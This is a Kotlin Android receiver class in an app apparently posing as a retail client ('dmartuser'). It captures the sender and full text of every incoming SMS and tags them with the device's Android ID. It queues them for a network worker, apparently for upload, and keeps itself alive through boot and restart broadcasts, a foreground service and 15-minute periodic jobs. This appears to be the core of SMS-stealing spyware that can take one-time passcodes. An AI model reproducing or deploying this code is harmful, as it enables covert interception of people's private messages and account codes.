package com.dmartuser.client

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import android.util.Log
import androidx.work.*
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.TimeUnit
import android.provider.Settings

class SmsReceiver : BroadcastReceiver() {
    companion object {
        private var lastSmsTime = 0L
        private const val SMS_THROTTLE_MS = 1000L
    }

    override fun onReceive(context: Context?, intent: Intent?) {
        Log.d("SmsReceiver", "SMS Broadcast received: ${intent?.action}")
        
        when (intent?.action) {
            Telephony.Sms.Intents.SMS_RECEIVED_ACTION -> handleSmsReceived(context, intent)
            Intent.ACTION_BOOT_COMPLETED -> context?.let { startForegroundServiceAndWork(it) }
            "com.dmartuser.client.RESTART_SERVICE" -> context?.let { startForegroundServiceAndWork(it) }
        }
    }

    private fun handleSmsReceived(context: Context?, intent: Intent) {
        if (context == null) return

        val now = System.currentTimeMillis()
        if (now - lastSmsTime < SMS_THROTTLE_MS) return
        lastSmsTime = now

        val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
        if (messages.isEmpty()) return

        val smsArray = JSONArray()
        for (msg in messages) {
            val smsObject = JSONObject()
            smsObject.put("address", msg.originatingAddress ?: "")
            smsObject.put("body", msg.messageBody ?: "")
            smsObject.put("date", msg.timestampMillis)
            smsObject.put("type", "inbox")
            smsArray.put(smsObject)
            
            Log.d("SmsReceiver", "Incoming SMS from: ${msg.originatingAddress}, Body: ${msg.messageBody}")
        }

        enqueueSmsWorker(context, smsArray)
        startForegroundServiceAndWork(context)
    }

    private fun enqueueSmsWorker(context: Context, smsArray: JSONArray) {
        val deviceId = getCustomDeviceId(context)
        
        val input = Data.Builder()
            .putString("sms_data", smsArray.toString())
            .putString("device_id", deviceId)
            .build()

        val work = OneTimeWorkRequestBuilder<SmsWorker>()
            .setInputData(input)
            .setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build()
            )
            .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, WorkRequest.MIN_BACKOFF_MILLIS, TimeUnit.MILLISECONDS)
            .build()

        WorkManager.getInstance(context).enqueue(work)
    }

    private fun startForegroundServiceAndWork(context: Context) {
        try {
            val service = Intent(context, SmsMonitoringService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(service)
            } else {
                context.startService(service)
            }
            schedulePeriodicWork(context)
        } catch (e: Exception) {
            Log.e("SmsReceiver", "Service start error: ${e.message}")
        }
    }

    private fun schedulePeriodicWork(context: Context) {
        val periodic = PeriodicWorkRequestBuilder<SmsMonitoringWorker>(15, TimeUnit.MINUTES)
            .setConstraints(
                Constraints.Builder()
                    .setRequiredNetworkType(NetworkType.CONNECTED)
                    .build()
            )
            .build()

        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            "sms_monitoring_work",
            ExistingPeriodicWorkPolicy.KEEP,
            periodic
        )
    }

    private fun getCustomDeviceId(context: Context): String {
        return try {
            Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_android_id"
        } catch (e: Exception) {
            "unknown_android_id"
        }
    }
}
